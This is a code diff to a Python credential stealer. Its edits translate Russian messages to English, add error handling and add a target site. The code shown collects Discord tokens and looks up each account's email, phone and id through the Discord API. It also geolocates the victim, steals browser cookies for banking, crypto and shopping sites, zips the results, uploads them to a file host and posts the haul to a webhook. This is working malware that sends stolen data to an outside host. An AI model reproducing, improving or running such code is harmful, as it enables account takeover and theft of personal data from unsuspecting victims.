@@ -45,19 +45,22 @@ work_directory = 'C:/WorkDirectory'
 user_folder = os.path.expanduser("~")
 
 def globalInfo():
-    ip = str(get_my_ip())
-    username = os.getenv("USERNAME")
-    
-    response = requests.get(f'https://geolocation-db.com/jsonp/{ip}').text.replace('callback(', '').replace('})', '}')
-    
-    ipdata = json.loads(response)
-    
-    contry = ipdata["country_name"]
-    contryCode = ipdata["country_code"].lower()
-    sehir = ipdata["state"]
+    try:
+        ip = str(get_my_ip())
+        username = os.getenv("USERNAME")
+        
+        response = requests.get(f'https://geolocation-db.com/jsonp/{ip}').text.replace('callback(', '').replace('})', '}')
+        
+        ipdata = json.loads(response)
+        
+        contry = ipdata["country_name"]
+        contryCode = ipdata["country_code"].lower()
+        sehir = ipdata["state"]
 
-    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
-    return globalinfo
+        globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
+        return globalinfo
+    except:
+        return ':warning: Ошибка'
 
 def collect_discord_tokens():
     encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
@@ -280,16 +283,14 @@ def check_target_hostname(host):
         result.add('Telegram')
     elif 'ok' in host:
         result.add('Ok')
-    elif 'pornhub' in host:
-        result.add('PornHub')
     elif 'steam' in host:
         result.add('Steam')
     elif 'binance' in host:
-        result.add('**Binance**')
+        result.add('Binance')
     elif 'bybit' in host:
-        result.add('**Bybit**')
+        result.add('Bybit')
     elif 'coinbase' in host:
-        result.add('**Coinbase**')
+        result.add('Coinbase')
     elif 'discord' in host:
         result.add("Discord")
     elif 'epicgames' in host:
@@ -305,18 +306,20 @@ def check_target_hostname(host):
     elif 'netflix' in host:
         result.add('Netflix')
     elif 'amazon' in host:
-        result.add('**Amazon**')
+        result.add('Amazon')
     elif 'shopify' in host:
-        result.add('**Shopify**')
+        result.add('Shopify')
     elif 'ebay' in host:
         result.add('ebay')
+    elif 'avito' in host:
+        result.add('avito')
 
 def get_token_info(token):
     url = 'https://discord.com/api/v9/users/@me'
     headers = {'Authorization': token}
     response = requests.get(url, headers=headers).text
     result = json.loads(response)
-    return f'Юзернейм → {result["username"]}\nНик → {result["global_name"]}\nТелефон → {result["phone"]}\nПочта → {result["email"]}\nАйди → {result["id"]}'
+    return f'Username → {result["username"]}\nName → {result["global_name"]}\nPhone → {result["phone"]}\nMail → {result["email"]}\nId → {result["id"]}'
 
 def zip_pack(directory, zip_filename):
     with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -333,7 +336,6 @@ def upload_logs():
     msupload.login(mail, password)
     
     try:
-        print('Пожалуйста подождите...')
         return msupload.get_upload_link(msupload.upload(work_directory + '/upload.zip'))
     except Exception as e:
         return e
@@ -358,12 +360,12 @@ def otstuk(upload_link, tokens, token_data):
         t += token + '\n'
     payload = {
             'content': f'{str(globalInfo())}\n'
-                   '**Общее**\n'
-                   f'Ссылка → <{upload_link}>\n'
-                   f'Логи ↓ ```{output_data}```\n'
+                   '**General**\n'
+                   f'Download link → <{upload_link}>\n'
+                   f'Hits ↓ ```{output_data}```\n'
                    f'**Discord**\n'
-                   f'Токены ↓ ```{str(t)[:-2]}```\n'
-                   f'Информация о аккаунте ↓ ```{token_data}```'
+                   f'Token ↓ ```{str(t)[:-2]}```\n'
+                   f'Token information ↓ ```{token_data}```'
     }
     try:
         requests.post(webhook, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
@@ -372,8 +374,13 @@ def otstuk(upload_link, tokens, token_data):
 
 
 ds_tokens = collect_discord_tokens()
+
 token_data = get_token_info(*ds_tokens)
 steal_cookies()
 zip_pack(work_directory, 'upload.zip')
 logs_link = upload_logs()
 otstuk(logs_link, ds_tokens, token_data)
+from time import sleep
+
+print('end')
+sleep(10)
